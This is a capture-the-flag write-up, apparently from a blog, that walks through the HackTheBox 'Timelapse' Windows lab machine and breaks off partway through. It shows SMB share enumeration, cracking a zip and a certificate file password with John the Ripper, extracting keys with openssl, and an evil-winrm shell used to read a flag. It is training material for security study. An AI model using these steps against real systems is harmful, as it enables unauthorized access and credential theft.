full_description = '''HTB Timelapse Walkthrough I solved the hack-the-box for a Windows machine that was giving me problems. This is how I solved it to get the admin password. Andy74 Jun 9, 2024 • 20 min read This AI-generated image was created using Microsoft Designer I solved the hack-the-box for a Windows machine that was giving me some problems. Here is how I solved it to get the admin password.This time the nmap scan does not give the desired results immediately.Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 21:58 CEST Note: Host seems down. If it is really up, but blocking our ping probes, try -Pn Nmap done: 1 IP address (0 hosts up) scanned in 3.18 secondsThen we proceed to force the scan even in the absence of the ping response (as suggested).Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-15 22:01 CEST Nmap scan report for 10.10.11.152 Host is up (0.046s latency). Not shown: 989 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-16 04:20:20Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ldapssl? 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) 3269/tcp open globalcatLDAPssl? Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h18m49s | smb2-time: | date: 2022-04-16T04:20:24 |_ start_date: N/A | smb2-security-mode: | 3.1.1: |_ Message signing enabled and required Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 68.76 secondsThere are many open ports, but the ones that immediately attracted my attention are those of the SAMBA protocol (this was to be expected in a windows machine), the 445 and the 139.Before moving on to some more specific tools, let's try some simple enumeration. (I know I'll regret it and will have to retrace my steps).┌──(in7rud3r㉿Mykali)-[~/Dropbox/hackthebox/_10.10.11.152 - Timelapse (win)] └─$ smbclient -L \\\\10.10.11.152\\ Enter WORKGROUP\in7rud3r's password: Sharename Type Comment --------- ---- ------- ADMIN$ Disk Remote Admin C$ Disk Default share IPC$ IPC Remote IPC NETLOGON Disk Logon server share Shares Disk SYSVOL Disk Logon server share Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.152 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup availableReally? Shares?Well, it would be a big mistake not to take a look.┌──(in7rud3r㉿Mykali)-[~/Dropbox/hackthebox/_10.10.11.152 - Timelapse (win)] └─$ smbclient \\\\10.10.11.152\\Shares Enter WORKGROUP\in7rud3r's password: Try "help" to get a list of possible commands. smb: \> dir . D 0 Mon Oct 25 17:39:15 2021 .. D 0 Mon Oct 25 17:39:15 2021 Dev D 0 Mon Oct 25 21:40:06 2021 HelpDesk D 0 Mon Oct 25 17:48:42 2021 6367231 blocks of size 4096. 1431852 blocks available smb: \>Let's go deeper!smb: \> cd dev smb: \dev\> dir . D 0 Mon Oct 25 21:40:06 2021 .. D 0 Mon Oct 25 21:40:06 2021 winrm_backup.zip A 2611 Mon Oct 25 17:46:42 2021 6367231 blocks of size 4096. 1431852 blocks available smb: \dev\> cd .. smb: \> cd helpdesk smb: \helpdesk\> dir . D 0 Mon Oct 25 17:48:42 2021 .. D 0 Mon Oct 25 17:48:42 2021 LAPS.x64.msi A 1118208 Mon Oct 25 16:57:50 2021 LAPS_Datasheet.docx A 104422 Mon Oct 25 16:57:46 2021 LAPS_OperationsGuide.docx A 641378 Mon Oct 25 16:57:40 2021 LAPS_TechnicalSpecification.docx A 72683 Mon Oct 25 16:57:44 2021 6367231 blocks of size 4096. 1431852 blocks availableLet's take what we found and analyze it locally.smb: \> mask "" smb: \> recurse ON smb: \> prompt OFF smb: \> mget * getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (7.5 KiloBytes/sec) (average 7.5 KiloBytes/sec) getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (1605.9 KiloBytes/sec) (average 1073.1 KiloBytes/sec) getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (323.7 KiloBytes/sec) (average 896.3 KiloBytes/sec) getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (1324.2 KiloBytes/sec) (average 1008.2 KiloBytes/sec) getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (221.8 KiloBytes/sec) (average 890.0 KiloBytes/sec) smb: \>The content of the share appears to be part of the documentation and installation of the Microsoft "Local Administrator Password Solution" (LAPS) package and a zip file protected by a password. I have some doubts that it could be a modified version, so I decide to install it on a virtual machine and connect to the HTB VPN to try to reach the BOX and try some approaches.I tried connecting, but I get the message that no LDAP server is found, even though the port appears to be open. This is likely to be a simple clue left there to give some hints in the next steps.Let's go ahead and try to open the password-protected compressed file. Below is a link to learn more.ZIP File Password Recovery Online | passwordrecovery.ioLearn how to crack a password protected ZIP file and try the process online with our Free tool.passwordrecovery.ioWe extracted the password hash from the zip file with the support tools of "john the ripper" and tried to crack it.┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev] └─$ zip2john winrm_backup.zip > zip.hash ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8 ┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev] └─$ ls -la total 20 drwxr-xr-x 2 in7rud3r in7rud3r 4096 Apr 30 21:03 . drwxr-xr-x 4 in7rud3r in7rud3r 4096 Apr 15 22:22 .. -rw-r--r-- 1 in7rud3r in7rud3r 2611 Apr 15 22:22 winrm_backup.zip -rw-r--r-- 1 in7rud3r in7rud3r 4962 Apr 30 21:03 zip.hash ┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status supremelegacy (winrm_backup.zip/legacyy_dev_auth.pfx) 1g 0:00:00:00 DONE (2022-04-30 21:07) 1.030g/s 3576Kp/s 3576Kc/s 3576KC/s surkerior..suppamas Use the "--show" option to display all of the cracked passwords reliably Session completed. Perfect! Let's extract the contents of the file and see how we can move forward.┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev] └─$ unzip -d ./extract winrm_backup.zip Archive: winrm_backup.zip [winrm_backup.zip] legacyy_dev_auth.pfx password: inflating: ./extract/legacyy_dev_auth.pfx ┌──(in7rud3r㉿Mykali)-[~/…/_10.10.11.152 - Timelapse (win)/attack/smb/Dev] └─$ ls -la extract total 12 drwxr-xr-x 2 in7rud3r in7rud3r 4096 Apr 30 21:09 . drwxr-xr-x 3 in7rud3r in7rud3r 4096 Apr 30 21:09 .. -rwxr-xr-x 1 in7rud3r in7rud3r 2555 Oct 25 2021 legacyy_dev_auth.pfxWow, a pfx file, the encrypted key of an SSL certificate. If we had the password to use it we could easily access the BOX. I tried the same password as the zip, but it would be too simple.But our dear friend John can always come to our aid; we proceed in the same way as the zip.┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ pfx2john legacyy_dev_auth.pfx > pfx.hash ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ john --wordlist=/usr/share/wordlists/rockyou.txt pfx.hash Using default input encoding: UTF-8 Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 SSE2 4x]) Cost 1 (iteration count) is 2000 for all loaded hashes Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes Will run 2 OpenMP threads Press 'q' or Ctrl-C to abort, almost any other key for status thuglegacy (legacyy_dev_auth.pfx) 1g 0:00:03:50 DONE (2022-04-30 21:27) 0.004335g/s 14006p/s 14006c/s 14006C/s thuglife06..thugers1 Use the "--show" option to display all of the cracked passwords reliably Session completed. Come on! That was too easy. We will probably encounter something very complicated later on. Let's take a look at the key, now that we have the password.Great. Other very useful info. I don't see any ssh ports open, so we'll take advantage of the windows WinRM protocol to connect. Evil-WinRM is the right tool for us, but I have to check how to use it with the pfx file we now have the password.Attacco a Sizzle utilizzando file SCF, Responder, Enumeration LDAP, Bloodhound, chisel per fare reverse proxy, e mimikatz per estrarre le credenziali dell’utente administratorViddinoIt looks like we're going to have to extract a series of keys and credentials from the encrypted certificate. Let's proceed.┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes Enter Import Password: ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ ls -la total 24 drwxr-xr-x 2 in7rud3r in7rud3r 4096 Apr 30 21:37 . drwxr-xr-x 3 in7rud3r in7rud3r 4096 Apr 30 21:09 .. -rw------- 1 in7rud3r in7rud3r 1952 Apr 30 21:37 key.pem -rwxr-xr-x 1 in7rud3r in7rud3r 2555 Oct 25 2021 legacyy_dev_auth.pfx -rw-r--r-- 1 in7rud3r in7rud3r 5077 Apr 30 21:23 pfx.hash ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ openssl rsa -in key.pem -out legacyy.key writing RSA key ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ ls -la total 28 drwxr-xr-x 2 in7rud3r in7rud3r 4096 Apr 30 21:38 . drwxr-xr-x 3 in7rud3r in7rud3r 4096 Apr 30 21:09 .. -rw------- 1 in7rud3r in7rud3r 1952 Apr 30 21:37 key.pem -rwxr-xr-x 1 in7rud3r in7rud3r 2555 Oct 25 2021 legacyy_dev_auth.pfx -rw------- 1 in7rud3r in7rud3r 1675 Apr 30 21:38 legacyy.key -rw-r--r-- 1 in7rud3r in7rud3r 5077 Apr 30 21:23 pfx.hash ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ openssl x509 -outform der -in key.pem -out certificate.cer unable to load certificate 140660216280448:error:0909006C:PEM routines:get_name:no start line:../crypto/pem/pem_lib.c:745:Expecting: TRUSTED CERTIFICATEOuch! It seemed to me that everything was going too well. I tried to figure out what is going wrong with the extraction of the certificate, but I didn't get over it. I needed to look for an alternative.Extracting the certificate and keys from a .pfx file┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt Enter Import Password: ┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ ls -la total 32 drwxr-xr-x 2 in7rud3r in7rud3r 4096 Apr 30 22:20 . drwxr-xr-x 3 in7rud3r in7rud3r 4096 Apr 30 21:09 .. -rw------- 1 in7rud3r in7rud3r 1238 Apr 30 22:20 cert.crt -rw------- 1 in7rud3r in7rud3r 1952 Apr 30 21:37 key.pem -rwxr-xr-x 1 in7rud3r in7rud3r 2555 Oct 25 2021 legacyy_dev_auth.pfx -rw------- 1 in7rud3r in7rud3r 1675 Apr 30 21:38 legacyy.key -rw-r--r-- 1 in7rud3r in7rud3r 5077 Apr 30 21:23 pfx.hashWe're back in the race.┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ sudo evil-winrm -i 10.10.11.152 -c cert.crt -k legacyy.key -P 5986 /usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection_opts.rb:71:in `validate_required_fields': user is a required option (RuntimeError) from /usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection_opts.rb:59:in `validate' from /usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection_opts.rb:31:in `create_with_defaults' from /usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:64:in `configure_connection_opts' from /usr/share/rubygems-integration/all/gems/winrm-2.3.6/lib/winrm/connection.rb:27:in `initialize' from /usr/share/rubygems-integration/all/gems/evil-winrm-3.3/lib/evil-winrm.rb:290:in `new' from /usr/share/rubygems-integration/all/gems/evil-winrm-3.3/lib/evil-winrm.rb:290:in `connection_initialization' from /usr/share/rubygems-integration/all/gems/evil-winrm-3.3/lib/evil-winrm.rb:470:in `main' from /usr/share/rubygems-integration/all/gems/evil-winrm-3.3/lib/evil-winrm.rb:967:in `<top (required)>' from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require' from <internal:/usr/lib/ruby/vendor_ruby/rubygems/core_ext/kernel_require.rb>:85:in `require' from /usr/share/rubygems-integration/all/gems/evil-winrm-3.3/bin/evil-winrm:3:in `<top (required)>' from /usr/bin/evil-winrm:25:in `load' from /usr/bin/evil-winrm:25:in `<main>'But I'm immediately stopped again... It all seemed too simple. I double-checked all the steps, extracted the keys again, but in the end, the solution emerged by reading some documentation on the tool's GitHub repository (Evil-WinRM) crossing the info with some suggestions in the forum.┌──(in7rud3r㉿Mykali)-[~/…/attack/smb/Dev/extract] └─$ sudo evil-winrm -i 10.10.11.152 -c cert.crt -k legacyy.key -S Evil-WinRM shell v3.3 Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion Warning: SSL enabled Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\Users\legacyy\Documents> whoami timelapse\legacyy *Evil-WinRM* PS C:\Users\legacyy\Documents> cd .. *Evil-WinRM* PS C:\Users\legacyy> cd Desktop *Evil-WinRM* PS C:\Users\legacyy\Desktop> dir Directory: C:\Users\legacyy\Desktop Mode LastWriteTime Length Name ---- ------------- ------ ---- -ar--- 4/30/2022 8:54 PM 34 user.txt *Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt b******************************5 *Evil-WinRM* PS C:\Users\legacyy\Documents> First flag. I approached some first attempts to retrieve the machine information but don't seem to be successful. However, I can understand from the folders that, probably, we are in the presence of a 64-bit machine.*Evil-WinRM* PS C:\Users\legacyy\Documents> systeminfo Program 'systeminfo.exe' failed to run: Access is deniedAt line:1 char:1 + systeminfo + ~~~~~~~~~~. At line:1 char:1 + systeminfo + ~~~~~~~~~~ + CategoryInfo : ResourceUnavailable: (:) [], ApplicationFailedException + FullyQualifiedErrorId : NativeCommandFailed *Evil-WinRM* PS C:\Users\legacyy\Documents> wmic os get Caption,CSDVersion /value WMIC.exe : ERROR: + CategoryInfo : NotSpecified: (ERROR::String) [], RemoteException + FullyQualifiedErrorId : NativeCommandError Description = Access denied*Evil-WinRM* PS C:\Users\legacyy\Documents> *Evil-WinRM* PS C:\Users\legacyy\Documents> ver The term 'ver' is not recognized as the name of a cmdlet, fun'''
